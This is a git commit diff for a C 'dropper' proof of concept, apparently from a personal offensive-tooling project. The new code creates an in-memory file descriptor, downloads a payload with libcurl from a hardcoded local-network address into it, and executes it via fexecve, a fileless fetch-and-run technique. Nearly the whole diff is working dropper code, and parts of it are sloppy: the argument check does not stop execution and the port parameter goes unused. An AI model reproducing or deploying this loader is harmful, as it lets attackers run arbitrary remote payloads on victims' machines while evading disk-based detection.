4737966c432bbef25ad5b008d5e4d959f8e46f53
P4ral1ax <braydenjw00@gmail.com>
2022-12-28 15:53:52 -0500

    C Dropper POC

--- dropper/dropper.c
+++ dropper/dropper.c
@@ -22,54 +22,24 @@ int create_memfd(char* fd_name){
 }
 
 
-void retrieve_file1(char* ip, char* port, char* filepath) {
-    int socket_desc;
-    int total_len = 0;
-    struct sockaddr_in server;
-    char* message;
-    char server_reply[10000];
-    
-    /* Create Socket */
-    socket_desc = socket(AF_INET , SOCK_STREAM , 0);
-    if (socket_desc == -1) {
-        printf("Could not create socket");
-    }
-    /* Set Options & Connect */
-    server.sin_addr.s_addr = inet_addr(ip);
-    server.sin_family = AF_INET;
-    server.sin_port = htons(port);
-    if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0) {
-        puts("connect error");
-        return 1;
-    }
-    /* Send Request */
-    message = snprint("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", filepath, ip);
-    if( send(socket_desc , message , strlen(message) , 0) < 0){
-        puts("Send failed");
-        return 1;
-    }
-    /* Where I am lost 
-    while(1){
-        int received_len = recv(socket_desc, server_reply , sizeof server_reply , 0);
+void write_file(char* url, long port, char* filepath) {
+    CURL *curl;
+    FILE *fp;
+    CURLcode res;
+    char outfilename[100];
+    strcpy(outfilename, filepath);
 
-        if( received_len < 0 ){
-            puts("recv failed");
-            break;
-        }
-        total_len += received_len;
-        fwrite(server_reply , received_len , 1, file);
-        printf("\nReceived byte size = %d\nTotal lenght = %d", received_len, total_len);
-
-        if( total_len >= file_len ){
-            break;
-        }   
-    }*/
-    return;
-}
-
-
-void write_content(){
-    printf("[+] Writing to fd\n");
+    curl = curl_easy_init();                                                                                                                                                                                                                                                           
+    if (curl) {   
+        fp = fopen(outfilename,"wb");
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
+        // curl_easy_setopt(curl, CURLOPT_PORT, port);
+        res = curl_easy_perform(curl);
+        curl_easy_cleanup(curl);
+        fclose(fp);
+    }   
     return;
 }
 
@@ -78,7 +48,8 @@ void exec_fd(int fd, char* evp[]){
     printf("[+] Executing file\n");
     pid_t pid = fork();
     if(pid == 0){
-        char* fname = snprint("/proc/self/fd/%d", fd);
+        char fname[128];
+        int j = snprintf(fname, 128, "/proc/self/fd/%d", fd);
         char* p_argv[] = {fname, NULL};
         fexecve(fd, p_argv, evp);
     }
@@ -87,12 +58,20 @@ void exec_fd(int fd, char* evp[]){
 
 
 int main(int argc, char *argv[], char * envp[]){
-    char* fd_name;
-    char* url;
+    char* fd_name = "psovaya";
+    int fd_num;
+    char* url = "http://192.168.1.188:8000/helloworld";
+    char fd_path[128];
     char* usage = "Usage : ./dropper {url}\n";
 
-    fd_name = "psovaya";
-    create_memfd(fd_name);
-    sleep(20);
+    // User Input
+    if (argc != 2) {
+        printf("Error : Incorrect count of Arguements\n%s", usage);
+    }
+
+    fd_num = create_memfd(fd_name);
+    int j = snprintf(fd_path, 128, "/proc/self/fd/%d", fd_num);
+    write_file(url, 8000, fd_path);
+    exec_fd(fd_num, envp);
     return 0;
 }
